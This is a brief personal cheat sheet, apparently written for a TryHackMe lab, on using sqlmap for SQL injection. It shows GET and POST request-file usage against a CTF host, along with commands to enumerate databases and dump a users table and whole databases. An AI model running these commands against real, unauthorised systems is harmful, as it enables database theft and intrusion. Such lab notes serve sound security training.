https://github.com/sqlmapproject/sqlmap

https://tryhackme.com/room/sqlmap


## GET

````shell
sqlmap --url 'http://<target>/search.php' --data "search=bao" --all -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
````


## POST

Build the request via browser, then copy it to a file:

1. `Copy request headers`
2. `Copy POST data`
3. Add a `*` to the vulnerable param

````
POST /~webmaster/search.php HTTP/1.1
Host: olympus.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://olympus.thm
Connection: keep-alive
Referer: http://olympus.thm/~webmaster/
Cookie: PHPSESSID=4unbbm4p9meqa65tcosdk5n4e4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

search=test*&submit
````

List the databases, tables and columns:

````shell
$ sqlmap -r request.txt --dbs
$ sqlmap -r search.php-request.txt -D mydb --tables
$ sqlmap -r search.php-request.txt -D mydb -T users --columns
$ sqlmap -r search.php-request.txt -D mydb -T users --dump
````

Dump the database "mydb" to multiple CSVs:

````shell
sqlmap -r search.php-request.txt -D mydb --dump-all
````

The dump goes to: `/home/kali/.local/share/sqlmap/output/mydb`
